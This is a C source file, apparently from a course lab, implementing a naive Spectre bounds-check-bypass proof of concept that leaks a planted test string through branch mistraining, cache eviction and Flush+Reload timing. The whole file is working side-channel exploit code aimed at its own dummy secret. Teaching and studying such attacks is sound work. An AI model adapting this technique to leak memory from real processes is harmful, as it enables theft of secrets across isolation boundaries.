#include "../../color.h"
#include <assert.h>
#include <ctype.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "timer.h"
#include "evict.h"

#define PAGE_SIZE 16384
#define CACHE_LINE_SIZE 128
#define SYMBOL_CNT (1 << (sizeof(char) * 7))
#define ISB() __asm__ __volatile__("isb" ::: "memory")

// The secret information
static const char secret_template[] = "The cake is a lie!";
static char    *secret        = NULL;       // will point inside secret_page
static uint8_t *secret_page   = NULL;       // base of mmap'ed page
static size_t   secret_line_idx = 0; 

static const char *secret1 = "The cake is a lie!";

uint8_t* flush_buffer;


// Evict caches by reading through a large buffer bigger than LLC.
// Tune EVICT_SIZE if your Mac has an unusually large LLC.
#define EVICT_SIZE (64 * 1024 * 1024)
#define STRIDE 128                      // cache line-ish
static unsigned char *evict_buf = NULL;


static void init_secret_on_page(size_t line_idx, bool cross_boundary)
{
    size_t page_size  = PAGE_SIZE;        // 16 KiB
    size_t line_size  = CACHE_LINE_SIZE;  // 128 B
    size_t secret_len = sizeof(secret_template) - 1; // without '\0'

    // mmap a single page, page-aligned
    secret_page = mmap(NULL, page_size,
                       PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS,
                       -1, 0);
    if (secret_page == MAP_FAILED) {
        perror("mmap secret_page");
        exit(1);
    }

    size_t max_offset   = page_size - (secret_len + 1); // keep entire string in page
    size_t nr_lines     = page_size / line_size;
    size_t offset       = 0;

    if (!cross_boundary) {
        // Old behavior: start exactly on a cache-line boundary
        if (line_idx >= nr_lines) {
            fprintf(stderr,
                    "Requested line index %zu is too large; max line is %zu\n",
                    line_idx, nr_lines - 1);
            exit(1);
        }

        offset = line_idx * line_size;

        if (offset > max_offset) {
            fprintf(stderr,
                    "Cannot place secret at line %zu without leaving page\n",
                    line_idx);
            exit(1);
        }
    } else {
        // New behavior: straddle the boundary between line_idx and line_idx+1
        if (line_idx + 1 >= nr_lines) {
            fprintf(stderr,
                    "Need a next line to cross: line_idx=%zu, nr_lines=%zu\n",
                    line_idx, nr_lines);
            exit(1);
        }

        // Place the secret so that roughly half is before the boundary
        // and half is after it.
        size_t boundary   = (line_idx + 1) * line_size;
        offset            = boundary - secret_len / 2;

        // Clamp so we stay within [line_idx * line_size, page_size)
        size_t min_offset = line_idx * line_size;
        if (offset < min_offset) {
            offset = min_offset;
        }

        if (offset > max_offset) {
            fprintf(stderr,
                    "Cannot place secret across line %zu without leaving page\n",
                    line_idx);
            exit(1);
        }

        // Optional sanity check: ensure we actually cross the boundary
        if (!(offset < boundary && offset + secret_len > boundary)) {
            fprintf(stderr,
                    "Internal error: secret does not cross line boundary as intended\n");
            exit(1);
        }
    }

    secret_line_idx = line_idx;
    secret          = (char *)(secret_page + offset);

    // Copy secret into that position (including '\0')
    memcpy(secret, secret_template, secret_len + 1);

    printf("Secret_page base = %p, secret = %p (line %zu, %s boundary)\n",
           (void*)secret_page,
           (void*)secret,
           secret_line_idx,
           cross_boundary ? "straddling" : "aligned to");
}

static void destroy_secret_page(void)
{
    if (secret_page) {
        munmap(secret_page, PAGE_SIZE);
        secret_page = NULL;
        secret      = NULL;
    }
}



static inline void init_eviction_buffer(void) {
    if (!evict_buf) {
        // posix_memalign for line alignment
        if (posix_memalign((void**)&evict_buf, 64, EVICT_SIZE) != 0 || !evict_buf) {
            perror("evict buffer alloc");
            exit(1);
        }
        memset(evict_buf, 0xA5, EVICT_SIZE);
    }
}

static inline void evict_caches(void) {
    volatile unsigned int acc = 0;
    for (size_t i = 0; i < EVICT_SIZE; i += STRIDE) acc += evict_buf[i];
    (void)acc;
}

static inline void flush_whole_cache() {
    init_eviction_buffer();
    evict_caches();
}

void _maccess(uint8_t* data) {
    uint32_t temp;
    __asm__ __volatile__ (
        "ldr %w0, [%1]" // Load register %0 from the memory address in %1
        : "=r" (temp) // Output: 'value' in a general-purpose register
        : "r" (data)    // Input: 'ptr' in a general-purpose register
        : "memory"     // Clobber: indicates memory has been accessed
    );
}

void fence(void) {
    __asm__ __volatile__("" ::: "memory");
}

uint32_t _time_maccess(void* ptr) {
  ISB();
  uint64_t t0 = timer_now();
  ISB();
  // volatile read to ensure the access happens
  volatile unsigned char tmp = *(volatile unsigned char *)ptr;
  (void)tmp;
  ISB();
  uint64_t t1 = timer_now();
  ISB();
  return t1 - t0;
}

// Branchless select based on the predicate (covered in class)
 size_t cselect(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
    return (T & mask) | (F & ~mask);
}

// Find the most hit cacheline and safely decode its character
void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
    uint64_t most_hits = 0, scd_most_hits = 0;
    unsigned char raw_c = '\0', scd_raw_c = '\0';
    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
        if (most_hits < hits[i]) {
            scd_most_hits = most_hits;
            scd_raw_c = raw_c;

            most_hits = hits[i];
            raw_c = i;
        }
    }

    *c = isprint(raw_c) ? raw_c : '?';
    char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3llu); "
           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3llu)\n",
           *c, raw_c, most_hits, scd_c, scd_raw_c, scd_most_hits);
}
// ====== End of helper functions ======

// ====== Below is a common Spectre "PoC" ======
uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
volatile int32_t array_size = 8;

int naive_victim(uint8_t *pages, int32_t idx, size_t stride) {
    if (idx < array_size) {
        volatile uint8_t temp = *(pages+(*(array+idx) * stride));
    }
    return 0;
}


void naive_attacker() {
    timer_init(true, 1);
    uint64_t threshold = calibrate_latency();
    find_fuzzy_eviction_set();
    printf("-----------------------------------------\n");
    uint64_t hits[SYMBOL_CNT] = { 0 };
    char buf[100] = { '\0' };

    // Pages for Flush+Reload
    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        return;
    }
    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);
    printf("SYMBOL_CNT: %d\n", SYMBOL_CNT);
    size_t stride = PAGE_SIZE;

    const bool mmap_or_const = false;
    const char *use_this = mmap_or_const ? secret1 : secret;
    int32_t malicious_index = (int64_t)use_this - (int64_t)array;
    printf("Secret address: %p, Array address: %p\n", use_this, array);
    printf("The malicious index is %p-%p=%#x\n", use_this, array,
           malicious_index);
    printf("-----------------------------------------\n");
    uint64_t fuzzy_evict_got_it_wrong = 0;
    for (size_t c = 0; c < strlen(use_this); c++) {
        for (size_t r = 0; r < 500; r++) {
            for (size_t t = 0; t < 128; t++) {
                bool is_attack = (t % 8 == 8 - 1);
                int32_t index = cselect(malicious_index + c, 0, is_attack);

                fuzzy_evict();
                fence();

                naive_victim(pages, index, stride);
            }

            for (size_t i = 0; i < SYMBOL_CNT; i++) {
                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
                uint8_t *ptr = pages + stride * idx;
                hits[idx] += _time_maccess(ptr) < threshold;
            }
        }

        // Save the recovered character
        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
        memset(hits, 0, sizeof(hits));
    }
    timer_shutdown();
    printf("Recovered secret: \"%s\"\n", buf);
    munmap(pages, PAGE_SIZE * SYMBOL_CNT);
    return;
}

int main(int argc, char **argv) {
    flush_buffer = (uint8_t*)malloc(256 * PAGE_SIZE);

    // Choose which cache line within the page to place the secret on.
    // Default: line 0 if no argument is given.
    size_t line_idx = 0;
    if (argc > 1) {
        line_idx = strtoul(argv[1], NULL, 0);
    }

    init_secret_on_page(line_idx, false);

    printf(YELLOW_F "Using a naive Spectre PoC\n" RESET_C);
    naive_attacker();

    destroy_secret_page();
    return 0;
}
